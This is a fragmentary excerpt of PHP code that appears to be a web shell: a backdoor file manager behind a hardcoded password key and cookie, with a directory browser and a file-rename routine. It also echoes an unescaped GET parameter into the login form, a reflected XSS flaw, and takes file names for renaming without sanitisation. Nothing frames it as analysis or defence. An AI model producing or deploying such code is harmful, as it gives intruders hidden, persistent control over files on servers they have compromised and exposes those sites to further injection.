...
$auth_key = "c93549658039566df837531be68c358a";
...
$pass = false;
if (isset($_COOKIE['pw_name_94902'])) {
    if(($_COOKIE['pw_name_94902']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_94902'])) {
        if(($_POST['pw_name_94902']) == $auth_key) {
            setcookie("pw_name_94902", $_POST['pw_name_94902']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_94902' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726859270777789 1726859270616745 1726859270114330 1726859270879862
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726859270777789 1726859270616745 1726859270114330 1726859270879862
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726859270777789 1726859270616745 1726859270114330 1726859270879862
            $name = PATH . "/" . $_GET['r'];
